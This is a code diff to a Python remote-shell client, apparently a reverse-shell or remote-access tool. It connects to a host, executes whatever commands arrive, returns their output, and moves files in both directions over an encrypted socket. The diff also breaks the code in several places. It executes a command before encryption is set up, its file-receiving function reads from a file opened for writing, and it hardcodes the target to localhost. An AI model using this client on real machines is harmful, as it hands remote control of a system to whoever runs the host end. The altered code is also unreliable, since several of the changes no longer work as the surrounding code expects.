@@ -5,7 +5,6 @@ import argparse
 import logging
 import select
 import socket
-import json
 import time
 import os
 
@@ -53,7 +52,9 @@ class NetManager:
                 continue
             break
         self.shell = Shell()
-        self.enc = ClientPyEncryption()
+        data = self.socket.recv(1024)
+        self.socket.sendall(self.execute_command(data))
+        self.crypto = ClientPyEncryption()
 
     def connect_to_host(self):
         """Establishes a connection to the host."""
@@ -64,14 +65,12 @@ class NetManager:
     def receive_file(self, filename):
         """Receives a file from the socket and writes it to the local system."""
         with open(filename, "wb") as f:
-            self.socket.sendall(b"0")
-            while (data := self.socket.recv(1024)):
-                f.write(data)
+            self.send_response(f.read())
 
     def send_file(self, filename):
         """Reads a file from the local system and sends it through the socket."""
         with open(filename, "rb") as f:
-            self.send_response(f.read(), len(f.read()))
+            self.send_response(f.read())
 
     def change_directory(self, cmd, folder):
         try:
@@ -80,9 +79,7 @@ class NetManager:
         except FileNotFoundError:
             stdout_value = f"error: {folder} not found".encode()
         finally:
-            message_length = len(stdout_value)
-            self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
-            self.socket.sendall(stdout_value)
+            self.send_response(stdout_value)
 
     def handle_file_transfers(self, data):
         """Handles file transfers based on the received data."""
@@ -92,11 +89,11 @@ class NetManager:
             self.change_directory(cmd, folder)
             return True
         if SENDING_FILE in data:
-            file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
+            file = data.decode().split("sendingfile ")[1].strip()
             self.receive_file(file)
             return True
         if GETTING_FILE in data:
-            file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
+            file = data.decode().split("gettingfile ")[1].strip()
             self.send_file(file)
             return True
         return False
@@ -104,35 +101,34 @@ class NetManager:
     def execute_command(self, data):
         """Executes a command and sends the response back through the socket."""
         stdout_value, stderr_value = self.shell.execute_command(data.decode("utf-8"))
-        msg = f"{stdout_value.decode()}{stderr_value.decode()}".encode()
-        self.send_response(msg, self.enc)
+        return f"{stdout_value.decode()}{stderr_value.decode()}".encode()
 
-    def send_response(self, data, encryption):
+    def send_response(self, data):
         if len(data) > 0:
-            message_length, message = encryption.encrypt_message(data, encryption.derived_key)
+            message_length, message = self.crypto.encrypt_message(data, self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
         else:
-            message_length, message = encryption.encrypt_message(NO_OUTPUT_SIGNAL.encode(), encryption.derived_key)
+            message_length, message = self.crypto.encrypt_message(NO_OUTPUT_SIGNAL.encode(), self.crypto.derived_key)
             self.socket.sendall(message_length.to_bytes(4, byteorder="big"))
             self.socket.sendall(message)
 
     def netloop(self):
-        self.enc.parameters = self.enc.get_params(self.socket)
+        self.crypto.parameters = self.crypto.get_params(self.socket)
 
         while True:
             try:
-                self.enc.derived_key = self.enc.get_derived_key(self.enc.parameters, self.socket)
+                self.crypto.derived_key = self.crypto.get_derived_key(self.crypto.parameters, self.socket)
             except ConnectionResetError:
                 break
             data = self.socket.recv(1024)
             if not data:
                 break
-            message = self.enc.decrypt_message(data, self.enc.derived_key)
+            message = self.crypto.decrypt_message(data, self.crypto.derived_key)
             if self.handle_file_transfers(message):
                 continue
             try:
-                self.execute_command(message)
+                self.send_response(self.execute_command(message))
             except BrokenPipeError:
                 logging.error("Connection closed by the host.")
                 break
@@ -143,8 +139,8 @@ def main():
     parser.add_argument("host")
     parser.add_argument("port", type=int)
 
-    args = parser.parse_args()
-    net_manager = NetManager(args.host, 4242)
+    # args = parser.parse_args()
+    net_manager = NetManager("localhost", 4242)
     net_manager.netloop()
 
 
